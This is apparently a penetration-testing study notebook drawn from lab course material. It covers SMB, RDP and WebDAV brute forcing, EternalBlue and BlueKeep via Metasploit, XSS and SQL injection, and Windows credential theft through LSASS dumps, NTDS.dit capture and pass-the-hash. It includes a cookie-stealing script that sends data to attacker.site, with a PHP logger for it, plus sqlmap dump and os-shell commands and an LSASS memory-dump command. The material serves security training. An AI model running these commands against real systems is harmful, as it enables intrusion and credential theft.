  		use scanner/smb/smb_login
  			set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
  	    		set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
* Once we have gained credentials
	[+] psexec.py
		psexec.py administrator@192.168.188.126 cmd.exe
	[+] metasploit
		use exploit/windows/smb/psexec
  		      set smbuser administrator
  		      set smbpass qweryuiop

###Eternalblue
* Nmap
	sudo nmap -sV -p445 -O 10.2.25.40
	nmap -sV -p445 10.2.25.40 smb-vuln-ms17-010

* Metasploit
        use windows/smb/ms17_010_eternalblue

###BlueKeep Vulnerability  
* This vulnerability has various illegitimate PoC's and exploit code that could be malicious in nature.
* Nmap 
	nmap -p 3389 192.168.188.126 
* Metasploit
	search BlueeKeep
        check
        	auxiliary/scanner/rdp/cve_2019_0708_bluekeep 
            	exploit/windows/rdp/cve_2019_0708_bluekeep_rce 
        show targets //check which versions are vulnerable to this exploit.
            + To identify a target correctly, we will need to:
                - Obtain a copy of the target binaries
                - Use msfpescan to locate a suitable return address
###RDP 
* Maybe it is on another port than 3389
* Metasploit
	use auxiliary/scanner/rdp/rdp_scanner
      	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://192.168.188.126 -s 3333
      	xfreerdp /u:administrator /p:qwertyuiop /v:192.168.188.126:3333

###WinRM
* We can utilize crackmapexec to perform a brute-force on WinRM and we can also utilize a ruby script called evil-winrm to obtain a command shell session on the target system
[+] WinRM is tipically used in the following ways:
	> Remotely access and interact with Windows hosts on a local network
  	> Remotely access and  execute commands on Windows systems on the internet
  	> Manage and configure Windows systems remotely
* WinRM typically uses TCP port 5985 and 5986(HTTPS)

###Hydra
	hydra -U rdp //-U for a module
  		-M : List of servers to attack
  	hydra -h | grep -i "Supported services" //To check the available modules
###IIS
* It can be used to host both static and dynamic web pages developed in ASP.NET and PHP
[+] Supported executable file extensions
	.asp
        .aspx
        .config
        .php
[+] WebDAV
	OJO!! The IIS server is not exploitable if the root folder is protected. Also if the root folder is protected, there is no way to determine if WebDAV is even enabled.
      	It is configued to run on the IIS web server
      	In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of a username and password.
      	> Tools
      		davtest(Davtest is a WebDAV scanner that sends exploit files to the WebDAV server and automatically creates the directory and uploads different format types of files. The tool also tried to execute uploaded files and gives us an output of successfully executed files)
      	  	cadaver(Cadaver is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc)
      		nmap -sV -p80 --script=http-enum 10.2.17.124
      	    	hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
	> Example

      	    		put /usr/share/webshells/asp/webshell.asp
      	    	Or we could use curl to upload a file
      	    		curl -T 'shell.txt' 'http://$ip'
      	    	After that delete webshell.asp

            	set HttpUsername
            	set PATH /webdav/metasploit.asp
###XSS 
* Finding an XSS is sometimes just a matter of injecting a harmless tag like 
	<i> : italics
      	<pre>
      	<plaintext>
      	<h1>Hello</h1>
* Some valid HTML/Javascript code
	<script>alert('XSS')</script>
      	<script>alert(window.location.hostname)</script>
      	<script>alert(document.cookie)</script> [Remember parameter http-only is very important for no access by javascript(document.cookie),java,etc.]
* Reflected XSS attacks
	//Is called reflected because an input field of the HTTP request sent by the browser gets inmediately reflected to the output page.
    	//When the malicious payload is carried inside the request that the browser of the victim sends to the vulnerable website. When users click on the link, they trigger the attack.

		http://victim.site/search.php?find=<payload>

* Stored XSS attacks
	//When the payload is sent to the vulnerable web server and then stored. The malicious code gets delivered each and every time a web browser hits the "injected" web page.
	//Cookie stealing via XSS. [Javascript can access cookies if they do not have the HttpOnly flag enabled.]
		<script>alert(document.cookie)</script>
    	//With the following code, you can send cookies content to an attacker-controlled site. The script generates an image object and points its src to a script on the attacker's server(attacker.site)
	//You post this in the vulnerable field
      		<script>
      		var i = new Image();
      		i.src="http://attacker.site/log.php?q="+escape(document.cookie);
      		</script>

      	//The log.php script saves the cookie in a text file on the attacker.site
      		<?php 
      		$filename="/tmp/log.txt";
      		$fp=fpopen($filename, 'a');
      		$cookie=$_GET['q'];
      		fwrite($fp, $cookie);
      		fclose($fp);
      		?>

      	//Another script
      		<?php
      		$ip = $_SERVER['REMOTE_ADDR'];
      		$browser = $_SERVER['HTTP_USER_AGENT'];
      		$fp = fopen('jar.txt', 'a');

      		fwrite($fp, $ip. ' '.$browser." \n");
      		fwrite($fp, urldecode($_SERVER['QUERY_STRING']). "  \n\n");
      		fclose($fp);
      		?>
* xsser 
	(with POST)
		xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' //The -p is from burpsuite
      		  --auto
      		  --Fp: Final payload //<script>alert("XSS")</script>
	(with GET)
      		xsser --url ... //Change 'nmap' by XSS ==> poll request //Remember
	URLs and books

###SQLi
* Comments
	'#' symbol
    	-- (two dashes followed by a space)
* Static query example inside a PHP page
	<?php
    	$dbhostname='1.2.3.4';
    	$dbuser='username';
    	$dbpassword='password';
    	$dbname='database';
    	
    	$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname); // Object referencing the connection to the database
    	$query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;";
    	
    	
    	$results = mysqli_query($connection, $query); //Function which submits the query to the database
    	display_results($results); //Renders the data
    	?>

* Dynamic query
	<?php
    	$dbhostname='1.2.3.4';
    	$dbuser='username';
    	$dbpassword='password';
    	$dbname='database';
    	
    	$id = $_GET['id']; //Using user-supplied input to build a query
    	
    	$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
    	$query = "SELECT Name, Description FROM Products WHERE ID='$id';";
    	
    	$results = mysqli_query($connection, $query);
    	display_results($results);
    	?>

	[+] One example of SQLi
		We can change the $id value to something like
    	  		' OR 'a'='a
    	  	The query then becomes:
    	  	  	SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a'; //This tells the database to select all the items in the Products table.

    	[+] Other example
    	  	Using UNION command
    	  	  	' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
    	  	The query then becomes:
    	  	  	SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';

* Finding SQL injections
	[+] string terminators: ' and "
    	[+] SQL commands: SELECT, UNION and others
    	[+] SQL comments: # or -- 
    	[+] In POST ==> username=userna'me&password=password

* Exploiting a boolean based SQLi
	user() //Current user using the database
    	substring() //Returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length
    		mysql > select substring('elearnsecurity', 2, 1);
    	  	mysql > select substring(user(), 1, 1) = 'r'; //To test True/False condition

		Combining those features, we can iterate over the letters of the username by using payloads such as:
    			[+] ' or substr(user(), 1, 1) = 'a
    		  	[+] ' or substr(user(), 1, 1) = 'b
    		  	...

    		When we find the first letter, we can move to the second:
    		  	[+] ' or substr(user(), 2, 1) = 'a
    		  	[+] ' or substr(user(), 2, 1) = 'b
    		  	...

* Exploiting UNION based SQLi
	[+] When some of the results of a query are directly displayed on the output page.
    		' UNION SELECT user(); -- -
    	[+] The query then becomes:
    		SELECT description FROM items WHERE id='' UNION SELECT user(); -- -'; //The third dash is because most of the browsers automatically remove trailing spaces in the URL so, if you need to inject a comment via a GET request, you have to add a character after the trailing space of the comment

	[+] Examples
		' UNION SELECT null; -- -
      		' UNION SELECT null,null; -- - //We need to know how many fiels are there

	[+] When we know the number of fields, it is time to test which fields are part of the output page.
		' UNION SELECT 'elsid1', 'elsid2'; -- - 

  
* SQLMap
	[+] When you want to read from a file, save it from Burpsuite
		sqlmap -r /root/bloglogin.req -p user --technique=B --banner -v3 
			--flush-session
		sqlmap -r request -p title --os-shell
		sqlmap -u http://victim.site/view.php?id=1441' -p id --technique=U //UNION based SQLi technique
    		sqlmap -u http://victim.site/view.php?id=1441 -b //banner
    		sqlmap -u http://victim.site/view.php?id=1441 --tables //tables
    		sqlmap -u http://victim.site/view.php?id=1441 --current-db selfi4you --columns
    		sqlmap -u http://victim.site/view.php?id=1441 --current-db selfi4you --dump
    		sqlmap -u http://victim.site/view.php?id=1441' -p search --technique=U --banner -v3 --fresh-queries
    			--current-db
    		  	--current-user
    		sqlmap -u http://victim.site/view.php?id=n' -p search --technique=U  -D blogdb --tables
    		sqlmap -u http://victim.site/view.php?id=n' -p search --technique=U  -D blogdb -T users --columns
    		sqlmap -u http://victim.site/view.php?id=n' -p search --technique=U  -D blogdb -T users -C username,password --dump

	[+] If you have to exploit a POST parameter:
    		> With sqlmap
    	  		sqlmap -u <URL> --data=<POST string> -p parameter [options] //Copy the POST string from a request intercepted with Burp Proxy
    	  	  	sqlmap -u http://sqlmap.test/login.php --data='user=a&pass=a' -p user --technique=B --banner
    	  	> With Burpsuite
    	    		username=a' or 1=1; -- -&pass=a //We could test one field and the other to see which is vulnerable

	[+] Another way
		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title --dbs

###Password attacks
    > The /etc/passwd file contains information about every existing user on the system and can be read by all users and services. Each entry in the /etc/passwd file identifies a user on the system. Each entry has seven fields containing a form of a database with information about the particular user, where a colon (:) separates the information. Accordingly, such an entry may look something like this:
cry0l1t3	    :x	                :1000	    :1000	    :cry0l1t3,,,	        :/home/cry0l1t3	    :/bin/bash
Login name		Password info		UID		    GUID		Full name/comments		Home directory		Shell
    > The /etc/shadow file has a unique format in which the entries are entered and saved when new users are created.

    > However, a few more files belong to the user management system of Linux. The other two files are /etc/passwd and /etc/group. In the past, the encrypted password was stored together with the username in the /etc/passwd file, but this was increasingly recognized as a security problem because the file can be viewed by all users on the system and must be readable. The /etc/shadow file can only be read by the user root.

The shadow file can only be accessed by the root account.

    > The x in the password field indicates that the encrypted password is in the /etc/shadow file. However, the redirection to the /etc/shadow file does not make the users on the system invulnerable because if the rights of this file are set incorrectly, the file can be manipulated so that the user root does not need to type a password to log in. Therefore, an empty field means that we can log in with the username without entering a password.


[+] Windows Authentication Process  
    > The Windows client authentication process can oftentimes be more complicated than with Linux systems and consists of many different modules that perform the entire logon, retrieval, and verification processes. In addition, there are many different and complex authentication procedures on the Windows system, such as Kerberos authentication. The Local Security Authority (LSA) is a protected subsystem that authenticates users and logs them into the local computer. In addition, the LSA maintains information about all aspects of local security on a computer. It also provides various services for translating between names and security IDs (SIDs).

    > The security subsystem keeps track of the security policies and accounts that reside on a computer system. In the case of a Domain Controller, these policies and accounts apply to the domain where the Domain Controller is located. These policies and accounts are stored in Active Directory. In addition, the LSA subsystem provides services for checking access to objects, checking user permissions, and generating monitoring messages.

    https://academy.hackthebox.com/storage/modules/147/Auth_process1.png

    > Local interactive logon is performed by the interaction between the logon process (WinLogon), the logon user interface process (LogonUI), the credential providers, LSASS, one or more authentication packages, and SAM or Active Directory. Authentication packages, in this case, are the Dynamic-Link Libraries (DLLs) that perform authentication checks. For example, for non-domain joined and interactive logins, the authentication package Msv1_0.dll is used.

    > Winlogon is a trusted process responsible for managing security-related user interactions. These include:
        + Launching LogonUI to enter passwords at login
        + Changing passwords
        + Locking and unlocking the workstation
    > It relies on credential providers installed on the system to obtain a user's account name or password. Credential providers are COM objects that are located in DLLs.
    > Winlogon is the only process that intercepts login requests from the keyboard sent via an RPC message from Win32k.sys. Winlogon immediately launches the LogonUI application at logon to display the user interface for logon. After Winlogon obtains a user name and password from the credential providers, it calls LSASS to authenticate the user attempting to log in.


* LSASS
    > Local Security Authority Subsystem Service (LSASS) is a collection of many modules and has access to all authentication processes that can be found in %SystemRoot%\System32\Lsass.exe. This service is responsible for the local system security policy, user authentication, and sending security audit logs to the Event log. In other words, it is the vault for Windows-based operating systems, and we can find a more detailed illustration of the LSASS architecture here ==> (https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10)?redirectedfrom=MSDN)

Authentication Packages	    Description
Lsasrv.dll	                The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which 
                            selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.
Msv1_0.dll	                Authentication package for local machine logons that don't require custom authentication.
Samsrv.dll	                The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.
Kerberos.dll	            Security package loaded by the LSA for Kerberos-based authentication on a machine.
Netlogon.dll	            Network-based logon service.
Ntdsa.dll	                This library is used to create new records and folders in the Windows registry.

    > Each interactive logon session creates a separate instance of the Winlogon service. The Graphical Identification and Authentication (GINA ==> https://docs.microsoft.com/en-us/windows/win32/secauthn/gina) architecture is loaded into the process area used by Winlogon, receives and processes the credentials, and invokes the authentication interfaces via the LSALogonUser (https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalogonuser) function.

* SAM database
    > The Security Account Manager (SAM ==> https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748(v=ws.10)?redirectedfrom=MSDN) is a database file in Windows operating systems that stores users' passwords. It can be used to authenticate local and remote users. SAM uses cryptographic measures to prevent unauthenticated users from accessing the system. User passwords are stored in a hash format in a registry structure as either an LM hash or an NTLM hash. This file is located in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.
    > Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (DC) must validate the credentials from the Active Directory database (ntds.dit), which is stored in %SystemRoot%\ntds.dit.
    > Microsoft introduced a security feature in Windows NT 4.0 to help improve the security of the SAM database against offline software cracking. This is the SYSKEY (syskey.exe) feature, which, when enabled, partially encrypts the hard disk copy of the SAM file so that the password hash values for all local accounts stored in the SAM are encrypted with a key.

    > (https://academy.hackthebox.com/storage/modules/147/authn_credman_credprov.png)

    > Credential Manager is a feature built-in to all Windows operating systems that allows users to save the credentials they use to access various network resources and websites. Saved credentials are stored based on user profiles in each user's Credential Locker. Credentials are encrypted and stored at the following location:
        PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
    > There are various methods to decrypt credentials saved using Credential Manager. We will practice hands-on with some of these methods in this module.

* NTDS

    > It is very common to come across network environments where Windows systems are joined to a Windows domain. This is common because it makes it easier for admins to manage all the systems owned by their respective organizations (centralized management). In these cases, the Windows systems will send all logon requests to Domain Controllers that belong to the same Active Directory forest. Each Domain Controller hosts a file called NTDS.dit that is kept synchronized across all Domain Controllers with the exception of Read-Only Domain Controllers(https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema). NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:

        + User accounts (username & password hash)
        + Group accounts
        + Computer accounts
        + Group policy objects



[+] Attacking LSASS
    > Upon initial logon, LSASS will:

        + Cache credentials locally in memory
        + Create access tokens (https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
        + Enforce security policies
        + Write to Windows security log (https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

    > Let's cover some of the techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.

* Dumping LSASS 
    > Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump. Let's cover techniques that can be performed using tools already built-in to Windows.
Task Manager Method

    > With access to an interactive graphical session with the target, we can use task manager to create a memory dump. This requires us to:
        + Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
        + A file called lsass.DMP is created and saved in:
        + Task Manager Method
            C:\Users\loggedonusersdirectory\AppData\Local\Temp
        + This is the file we will transfer to our attack host. We can use the file transfer method discussed in the Attacking SAM section of this module to transfer the dump file to our attack host.

    > Rundll32.exe & Comsvcs.dll Method

        + The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called rundll32.exe(https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32). This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.
        
        + Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to lsass.exe. This can be done from cmd or PowerShell:
            => Finding LSASS PID in cmd
                + From cmd, we can issue the command tasklist /svc and find lsass.exe and its process ID in the PID field.
                + Finding LSASS PID in cmd
                    C:\Windows\system32> tasklist /svc
            => Finding LSASS PID in PowerShell

                + From PowerShell, we can issue the command Get-Process lsass and see the process ID in the Id field.
                + Finding LSASS PID in PowerShell
                    PS C:\Windows\system32> Get-Process lsass
        + Once we have the PID assigned to the LSASS process, we can create the dump file.
            => Creating lsass.dmp using PowerShell
                + With an elevated PowerShell session, we can issue the following command to create the dump file:
                    PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
                + With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp). Recall that most modern AV tools recognize this as malicious and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.

                + If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.
                + Note: We can use the file transfer method discussed in the Attacking SAM section to get the lsass.dmp file from the target to our attack host.


    > Using Pypykatz to Extract Credentials

        + Once we have the dump file on our attack host, we can use a powerful tool called pypykatz(https://github.com/skelsec/pypykatz) to attempt to extract credentials from the .dmp file. Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows us to run it on Linux-based attack hosts. At the time of this writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host or we would need to run Mimikatz directly on the target, which is not an ideal scenario. This makes Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host.
        + Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let's run Pypykatz against the dump file and find out.
        + Running Pypykatz

            > The command initiates the use of pypykatz to parse the secrets hidden in the LSASS process memory dump. We use lsa in the command because LSASS is a subsystem of local security authority, then we specify the data source as a minidump file, proceeded by the path to the dump file (/home/peter/Documents/lsass.dmp) stored on our attack host. Pypykatz parses the dump file and outputs the findings:
                m1l0js@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
            > Lets take a more detailed look at some of the useful information in the output.

            > MSV(https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the SID, Username, Domain, and even the NT & SHA1 password hashes associated with the bob user account's logon session stored in LSASS process memory. This will prove helpful in the final stage of our attack covered at the end of this section.

		                password (hex)
            > WDIGEST is an older authentication protocol enabled by default in Windows XP - Windows 8 and Windows Server 2003 - Windows Server 2012. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST. We can study the details of that security update here(https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/).

            > Kerberos(https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS caches passwords, ekeys, tickets, and pins associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.

            > The Data Protection Application Programming Interface or DPAPI(https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications. Here are just a few examples of applications that use DPAPI and what they use it for:
            > Applications	Use of DPAPI
            Internet Explorer	        Password form auto-completion data (username and password for saved sites).
            Google Chrome	            Password form auto-completion data (username and password for saved sites).
            Outlook	                    Passwords for email accounts.
            Remote Desktop Connection	Saved credentials for connections to remote machines.
            Credential Manager	        Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.
            
            > Mimikatz and Pypykatz can extract the DPAPI masterkey for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. DPAPI attack techniques are covered in greater detail in the Windows Privilege Escalation module.

* Cracking the NT Hash with Hashcat

    > Now we can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user, which means we won't need to create a list of hashes as we did in the Attacking SAM section of this module. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.
        m1l0js@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

[+] Attacking Active Directory & NTDS.dit
    > Active Directory (AD) is a common and critical directory service in modern enterprise networks. AD is something we will repeatedly encounter, so we need to be familiar with various methods we can use to attack & defend these AD environments. It is safe to conclude that if the organization uses Windows, then AD is used to manage those Windows systems. Attacking AD is such an extensive & significant topic that we have multiple modules covering AD.
    > In this section, we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.
    > Like many of the attacks we have covered thus far, our target must be reachable over the network. This means it is highly likely that we will need to have a foothold established on the internal network to which the target is connected. That said, there are situations where an organization may be using port forwarding to forward the remote desktop protocol (3389) or other protocols used for remote access on their edge router(https://www.cisco.com/c/en/us/products/routers/what-is-an-edge-router.html) to a system on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network. Before we get hands-on with the attack methods, let's consider the authentication process once a Windows system has been joined to the domain. This approach will help us better understand the significance of Active Directory and the password attacks it can be susceptible to.
        (https://academy.hackthebox.com/storage/modules/147/ADauthentication_diagram.png)

    > Once a Windows system is joined to a domain, it will no longer default to referencing the SAM database to validate logon requests. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the hostname of the device proceeded by the Username (Example: WS01/nameofuser) or with direct access to the device then typing ./ at the logon UI in the Username field. This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform. It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network. Keep in mind that we can also study NTDS attacks by keeping track of this technique(https://attack.mitre.org/techniques/T1003/003/).

* Dictionary Attacks against AD accounts using CrackMapExec

    > Keep in mind that a dictionary attack is essentially using the power of a computer to guess a username &/or password using a customized list of potential usernames and passwords. It can be rather noisy (easy to detect) to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restrictions that may be applied through the use of Group Policy (https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791(v=ws.11)).
    > When we find ourselves in a scenario where a dictionary attack is a viable next step, we can benefit from trying to custom tailor our attack as much as possible. In this case, we can consider the organization we are working with to perform the engagement against and use searches on various social media websites and look for an employee directory on the company's website. Doing this can result in us gaining the names of employees that work at the organization. One of the first things a new employee will get is a username. Many organizations follow a naming convention when creating employee usernames.
    > Often, an email address's structure will give us the employee's username (structure: username@domain). For example, from the email address jdoe@inlanefreight.com, we see that jdoe is the username.
    > A tip from MrB3n: We can often find the email structure by Googling the domain name, i.e., “@inlanefreight.com” and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith. That way, email messages can get through, but the actual internal username isn’t disclosed, making password spraying harder. Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid. 

    > Creating a custom list of usernames
        + We can manually create our list(s) or use an automated list generator such as the Ruby-based tool Username Anarchy(https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats. Once the tool has been cloned to our local attack host using Git, we can run it against a list of real names as shown in the example output below:
            m1l0js@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
    > Launching the Attack with CrackMapExec
        + Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch our attack against the target domain controller using a tool such as CrackMapExec. We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller. Here is the command to do so:
            m1l0js@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
        + If the admins configured an account lockout policy, this attack could lock out the account that we are targeting. At the time of this writing (January 2022), an account lockout policy is not enforced by default with the default group policies that apply to a Windows domain, meaning it is possible that we will come across environments vulnerable to this exact attack we are practicing.
    > Event logs from the attack
        eventvwr > Windows Logs > Security > 4776
    > Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.

* Capturing NTDS.dit
    > NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at %systemroot$/ntds on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's Attacking SAM section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.
    > Connecting to a DC with Evil-WinRM
        + We can connect to a target DC using the credentials we captured.
            m1l0js@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
        + Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.
    > Checking Local Group Membership
        + Once connected, we can check to see what privileges bwilliamson has. We can start with looking at the local group membership using the command:
            *Evil-WinRM* PS C:\> net localgroup
        + We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.
    > Checking User Account Privileges including Domain
            *Evil-WinRM* PS C:\> net user bwilliamson
        + This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.
    > Creating Shadow Copy of C:
        + We can use vssadmin to create a Volume Shadow Copy (VSS => https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup & disaster recovery software to perform operations.
            *Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
    > Copying NTDS.dit from the VSS
        + We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.
            *Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
        + Before copying NTDS.dit to our attack host, we may want to use the technique we learned earlier to create an SMB share on our attack host. Feel free to go back to the Attacking SAM section to review that method if needed.
    > Transferring NTDS.dit to Attack Host
        + Now cmd.exe /c move can be used to move the file from the target DC to the share on our attack host.
            *Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

    !> A Faster Method: Using cme to Capture NTDS.dit
        + Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.
            m1l0js@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds

    !> What if we are unsuccessful in cracking a hash?
        > Pass-the-Hash Considerations
            + We can still use hashes to attempt to authenticate with a system using a type of attack called Pass-the-Hash (PtH). A PtH attack takes advantage of the NTLM authentication protocol to authenticate a user using a password hash. Instead of username:clear-text password as the format for login, we can instead use username:password hash. Here is an example of how this would work:
                m1l0js@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"


[+] Credential Hunting in Windows
    > Once we have access to a target Windows machine through the GUI or CLI, we can significantly benefit from incorporating credential hunting into our approach. Credential Hunting is the process of performing detailed searches across the file system and through various applications to discover credentials. To understand this concept, let's place ourselves in a scenario. We have gained access to an IT admin's Windows 10 workstation through RDP.
Search Centric

    > Many of the tools available to us in Windows have search functionality. In this day and age, there are search-centric features built into most applications and operating systems, so we can use this to our advantage on an engagement. A user may have documented their passwords somewhere on the system. There may even be default credentials that could be found in various files. It would be wise to base our search for credentials on what we know about how the target system is being used. In this case, we know we have access to an IT admin's workstation.

It would be wise to base our search for credentials on what we know about how the target system is being used. In this case, we know we have access to an IT admin's workstation.
    > What might an IT admin be doing on a day-to-day basis & which of those tasks may require credentials?
    > We can use this question & consideration to refine our search to reduce the need for random guessing as much as possible.
    > Key Terms to Search
        + Whether we end up with access to the GUI or CLI, we know we will have some tools to use for searching but of equal importance is what exactly we are searching for. Here are some helpful key terms we can use that can help us discover some 
            Passwords	    Passphrases	    Keys
            Username	    User account	Creds
            Users	        Passkeys	    Passphrases
            configuration	dbcredential	dbpassword
            pwd	            Login	        Credentials
